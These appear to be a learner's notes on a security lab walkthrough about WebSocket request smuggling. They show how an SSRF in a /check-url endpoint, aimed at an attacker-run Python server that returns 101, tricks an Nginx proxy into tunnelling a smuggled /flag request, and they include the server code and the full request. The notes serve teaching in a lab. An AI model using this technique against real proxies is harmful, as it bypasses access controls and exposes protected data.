So far, we've been working with a proxy that won't check the web server's response to determine whether the WebSocket upgrade was successful. In this task, we'll replace the vulnerable Varnish proxy with an Nginx proxy that checks responses before tunnelling requests through a WebSocket connection. The backend application will still have the `/socket` endpoint enabled with WebSockets and the `/flag` endpoint as our target. The new application can be accessed via `http://MACHINE_IP:8002/`.

First, let's try running the payload we used in the previous task to see if it works:
	![](Pasted%20image%2020250215034145.png)

Notice how Nginx won't leak the flag despite getting a `426` response for the initial WebSocket upgrade attempt. Since Nginx is checking the response code of the upgrade, it can determine that no valid WebSocket connection was established; therefore, it won't allow us to smuggle the `/flag` request.


## Tricking the Proxy
Since we can't just smuggle requests anymore, we need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fake `101 Switching Protocols` response without actually upgrading the connection in the backend.

While we won't be able to do this for all applications, if our target app has some vulnerability that allows us to proxy requests back to a server we control as attackers, we might be able to inject the `101 Switching Protocols` response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.
	![](Pasted%20image%2020250215034337.png)

## Leveraging SSRF
In this task's application, we will take advantage of an SSRF vulnerability to simulate a fake WebSocket upgrade. After a quick inspection, we can see that the application allows us to test the status of a URL. Each time we input a URL, the server will make a request to `http://MACHINE_IP:8002/check-url?server=<url>` and return the status code from the corresponding response:
	![](Pasted%20image%2020250215034452.png)

We can use `nc` in our AttackBox to check if we can direct a request to ourselves. We should get a response similar to this one:

```shell-session
nc -lvp 5555
Listening on 0.0.0.0 5555
Connection received on MACHINE_IP 52988
GET /test HTTP/1.1
Host: 10.10.11.155:5555
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

This means we can successfully use the SSRF vulnerability to influence the response of the backend server. All we need to do is spin up a web server that returns a `101` status, allowing us to fake a WebSocket upgrade.

### Attacker's Web Server
We can quickly set up a web server that responds with status 101 to every request with the following Python code:
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Let's save the code to a file named myserver.py in our AttackBox and run it with the following command. This should spin up a web server on port 5555 that will reply with a 101 status code to any request.

```shell
python3 myserver.py 5555
```


### Faking a WebSocket
We are finally ready to launch our payload. Let's use Burp's Repeater to send a request to **/check-url** against our malicious server. The request should look like this:

```shell
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: MACHINE_IP:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8002
```

If all goes as expected, you should get a request in your malicious web server and the flag value in Burp:
	![](Pasted%20image%2020250215035020.png)

Explanation: 
	1) SSRF must be present as we have the application to make request against our malicious server
	2) configuring our own server in order to respond with 101 (upgrading sockets)
	3) proxy will forward our 101 request directly to the backend server
	4) proxy will forward the backend server response containing sensitive data (bypassing proxy restriction)

**Note:**
	Remember that `/check-url` is not a WebSocket endpoint. We are just manipulating both the request and response that the proxy gets to make it believe this is a real WebSocket. This means that the proxy will tunnel the second request in our payload as if it were part of a WebSocket connection, but the backend will just process the request as HTTP since there's no WebSocket in reality.


**More info:**
- https://github.com/0ang3el/websocket-smuggle